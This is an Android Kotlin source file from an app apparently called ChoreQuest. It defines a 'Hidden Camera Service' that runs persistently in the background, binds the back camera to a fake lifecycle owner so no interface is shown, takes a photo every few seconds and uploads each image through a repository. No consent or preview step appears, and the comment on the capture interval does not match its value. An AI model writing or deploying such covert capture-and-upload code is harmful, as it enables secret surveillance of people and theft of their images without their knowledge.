package com.example.chorequest.ui.cameraX

import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.content.Intent
import android.graphics.BitmapFactory
import android.os.Build
import android.os.Handler
import android.os.IBinder
import android.util.Log
import androidx.camera.core.CameraSelector
import androidx.camera.core.ImageCapture
import androidx.camera.core.ImageCaptureException
import androidx.camera.lifecycle.ProcessCameraProvider
import androidx.core.app.NotificationCompat
import androidx.core.content.ContextCompat
import com.example.chorequest.repositories.ImageRepository
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import kotlinx.coroutines.withContext
import java.io.File
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale
import java.util.concurrent.ExecutorService
import java.util.concurrent.Executors

class CameraService : Service() {

    private lateinit var outputDirectory: File
    private lateinit var cameraExecutor: ExecutorService
    private var imageCapture: ImageCapture? = null
    private val handler = Handler()
    private val captureInterval: Long = 5_000 // 30 seconds

    override fun onCreate() {
        super.onCreate()
        cameraExecutor = Executors.newSingleThreadExecutor()
        outputDirectory = getExternalFilesDir(null)?.apply {
            mkdirs()
        } ?: filesDir

        initializeForegroundNotification()
        initializeCamera()
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        scheduleImageCapture()
        return START_STICKY
    }

    private fun initializeForegroundNotification() {
        val channelId = "HiddenCameraServiceChannel"
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                channelId,
                "Hidden Camera Service",
                NotificationManager.IMPORTANCE_LOW
            )
            getSystemService(NotificationManager::class.java)?.createNotificationChannel(channel)
        }
        val notification = NotificationCompat.Builder(this, channelId)
            .setContentTitle("Hidden Camera Service")
            .setContentText("Running in the background...")
            .setSmallIcon(android.R.drawable.ic_menu_camera)
            .build()

        startForeground(1, notification)
    }

    private fun initializeCamera() {
        val cameraProviderFuture = ProcessCameraProvider.getInstance(this)
        cameraProviderFuture.addListener({
            val cameraProvider = cameraProviderFuture.get()

            val cameraSelector = CameraSelector.DEFAULT_BACK_CAMERA
            imageCapture = ImageCapture.Builder().build()

            try {
                // Bind the camera lifecycle manually without LifecycleOwner
                cameraProvider.unbindAll()
                cameraProvider.bindToLifecycle(
                    FakeLifecycleOwner().apply { start() }, // Fake lifecycle owner for CameraX
                    cameraSelector,
                    imageCapture
                )
            } catch (exc: Exception) {
                Log.e("HiddenCameraService", "Failed to bind camera use cases: ${exc.message}")
            }
        }, ContextCompat.getMainExecutor(this))
    }

    private fun scheduleImageCapture() {
        handler.postDelayed({
            captureImage()
            scheduleImageCapture()
        }, captureInterval)
    }

    private fun captureImage() {
        val imageCapture = imageCapture ?: return

        val photoFile = File(
            outputDirectory,
            SimpleDateFormat("yyyyMMdd_HHmmss", Locale.US)
                .format(System.currentTimeMillis()) + ".jpg"
        )

        val outputOptions = ImageCapture.OutputFileOptions.Builder(photoFile).build()

        imageCapture.takePicture(
            outputOptions,
            ContextCompat.getMainExecutor(this),
            object : ImageCapture.OnImageSavedCallback {
                override fun onImageSaved(output: ImageCapture.OutputFileResults) {
                    Log.d("HiddenCameraService", "Image saved: ${photoFile.absolutePath}")
                    uploadImage(photoFile)
                }

                override fun onError(exception: ImageCaptureException) {
                    Log.e("HiddenCameraService", "Image capture failed: ${exception.message}")
                }
            }
        )
    }

    private fun uploadImage(photoFile: File) {
        CoroutineScope(Dispatchers.Main).launch {
            try {
                val result = withContext(Dispatchers.IO) {
                    val imageRepository = ImageRepository()
                    val filename = SimpleDateFormat("yyyyMMdd_HHmmss", Locale.US)
                        .format(Date())
                    val bitmap = BitmapFactory.decodeFile(photoFile.absolutePath)
                    val parts = imageRepository.prepareImagePart(bitmap, filename)
                    imageRepository.uploadImage(parts)
                }
            } catch (e: Exception) {
                Log.e("uploadImage", "Failed to upload image: ${e.message}")
            }
        }
    }

    override fun onDestroy() {
        super.onDestroy()
        handler.removeCallbacksAndMessages(null)
        cameraExecutor.shutdown()
    }

    override fun onBind(intent: Intent?): IBinder? = null
}
